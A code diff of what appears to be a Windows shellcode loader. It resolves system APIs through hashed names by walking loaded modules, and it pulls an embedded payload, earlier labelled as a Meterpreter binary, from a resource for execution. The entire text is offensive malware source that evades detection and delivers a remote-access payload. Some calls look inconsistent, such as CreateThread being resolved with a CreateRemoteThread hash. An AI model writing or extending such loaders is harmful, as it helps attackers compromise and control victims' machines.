@@ -18,9 +18,10 @@ VOID ResolveApi(PAPI instance) {
 	instance->win32.NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
 	instance->win32.CreateThread = (CreateThread_t)GetSymbolAddress(GetModuleAddress(KERNEL10), CREATEREMOTETHREAD);
 	instance->win32.NtWaitForSingleObjectEx = (NtWaitForSingleObjectEx_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECTEX);
-	instance->win32.FindResourceA = (FindResourceA_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
+	instance->win32.FindResourceW = (FindResourceW_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEW);
 	instance->win32.SizeofResource = (SizeofResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
 	instance->win32.LoadResource = (LoadResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
+	instance->win32.FreeResource = (FreeResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FREERESOURCE);
 	instance->win32.RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
 }
 
@@ -44,7 +45,7 @@ HMODULE GetModuleAddress(DWORD hash) {
 
 		auto mod = (PLDR_MODULE)((PBYTE)next - sizeof(DWORD) * 4);
 		auto name = mod->BaseDllName.Buffer;
-
+		
 		if (name) {
 			if (hash - HashString(name, wcslen(name)) == 0) {
 				return (HMODULE)mod->BaseAddress;
@@ -95,8 +96,8 @@ int main() {
 	ResolveApi(instance);
 
 	resource			= (PRESOURCE) instance->win32.RtlAllocateHeap(GetProcessHeap, NULL, sizeof(RESOURCE));
-	resource->Id		= MAKEINTRESOURCEA(IDR_METERPRETER_BIN1);
-	resource->Object	= instance->win32.FindResourceA(NULL, resource->Id, resource->Id);
+	resource->Id		= MAKEINTRESOURCEW(SHELLCODE);
+	resource->Object	= instance->win32.FindResourceW(NULL, resource->Id, RT_RCDATA);
 	resource->Length	= instance->win32.SizeofResource(NULL, resource->Object);
 	resource->hGlobal = instance->win32.LoadResource(NULL, resource->Object);
 
